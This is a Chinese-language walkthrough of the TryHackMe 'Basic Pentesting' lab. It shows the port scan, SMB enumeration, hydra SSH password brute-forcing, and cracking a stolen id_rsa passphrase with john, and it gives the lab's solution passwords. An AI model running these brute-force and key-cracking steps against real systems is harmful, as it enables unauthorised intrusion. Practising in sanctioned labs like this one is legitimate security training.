---
description: 本文相关内容：针对目标机器，练习攻击Web应用程序以及进行权限提升。
cover: ../../.gitbook/assets/moMbBki.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Basic Pentesting-练习

TryHackMe实验房间链接：[https://tryhackme.com/room/basicpentestingjt](https://tryhackme.com/room/basicpentestingjt)



## Web应用程序测试和提权(横向)练习

难度：easy

机器地址：

目标机ip：10.10.144.213

攻击机ip（OPENVPN连接时，为tun0地址）：10.14.30.69

**相关知识点：**

* 目录爆破
* hash解密
* 服务信息枚举
* Linux信息枚举

**操作：**

使用nmap进行端口扫描：

```shell
nmap -sV -sC -T4 10.10.144.213
#可以使用-oN 将nmap扫描的结果输出为具有普通格式的文本
```

![image-20221012172252559](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012172252559.png)

使用 dirsearch/dirbuster 查找Web 服务器的隐藏目录：

![image-20221012173810085](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012173810085.png)

获取目标机用户名：

_方法一：_

```shell
enum4linux  10.10.144.213 
```

![image-20221012181056091](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012181056091.png)

_方法二：_

```shell
#由之前的nmap扫描结果可知：目标机运行了Samba服务
#我们尝试使用匿名登录Samba
smbclient //10.10.144.213/anonymous 
#发现员工信息，成功获取目标机用户名
```

![image-20221012192545313](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012192545313.png)

获取用户用于ssh连接的密码：

```
hydra -l jan -P rockyou.txt ssh://10.10.144.213 
```

![image-20221012180924886](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012180924886.png)

使用ssh登陆目标机的用户账号查看敏感文件

```shell
ssh jan@10.10.144.213 -oHostKeyAlgorithms=+ssh-rsa 
#输入密码：armando
```

![image-20221012194722862](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012194722862.png)

发现其他用户的hash密钥--id\_rsa，将该密钥内容复制到攻击机上的idrsa.id\_rsa 中，先对idrsa.id\_rsa 进行加权操作，再尝试使用idrsa.id\_rsa通过ssh登录另一目标机用户，发现需要密码口令，在攻击机上使用john对idrsa.id\_rsa进行hash破解：

```shell
chmod 600 idrsa.id_rsa 
# ssh -i idrsa.id_rsa kay@10.10.144.213 -oHostKeyAlgorithms=+ssh-rsa 执行失败 提示输入密码口令
#提取密钥hash值
ssh2john idrsa.id_rsa > id_rsa_hash.txt
#破解hash值
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
```

![image-20221012195049211](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012195049211.png)

使用密码口令和idrsa.id\_rsa 通过ssh登陆目标机的另一用户账号，并查看敏感文件信息：

```shell
ssh -i idrsa.id_rsa kay@10.10.144.213 -oHostKeyAlgorithms=+ssh-rsa
#输入密码口令 beeswax
```

![image-20221012200551375](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012200551375.png)

**答题卡**

![image-20221012201210559](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012201210559.png)
